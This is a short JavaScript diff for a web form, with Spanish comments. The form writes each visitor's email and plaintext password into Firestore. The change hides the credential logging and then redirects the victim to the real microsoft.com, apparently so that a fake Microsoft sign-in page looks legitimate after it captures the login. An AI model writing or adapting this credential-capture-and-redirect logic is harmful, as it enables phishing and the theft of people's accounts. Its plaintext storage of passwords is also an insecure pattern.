@@ -72,9 +72,12 @@ document.addEventListener("DOMContentLoaded", function() {
                     password: password
                 })
                 .then((docRef) => {
-                    console.log('Pass: ' + password);
-                    console.log('Email: ' + email);
+                    //console.log('Pass: ' + password);
+                    //console.log('Email: ' + email);
                     console.log('Datos de usuario registrados en Firestore con ID:', docRef.id);
+
+                    // Redireccion a Microsoft
+                    location.href="https://www.microsoft.com";
                 })
                 .catch((error) => {
                     console.error('Error al registrar datos en Firestore:', error);
@@ -87,6 +90,5 @@ document.addEventListener("DOMContentLoaded", function() {
                 console.error('Error al registrar usuario:', errorCode, errorMessage);
             });
 
-            location.href="https://www.youtube.com/watch?v=dQw4w9WgXcQ";
     });
 });
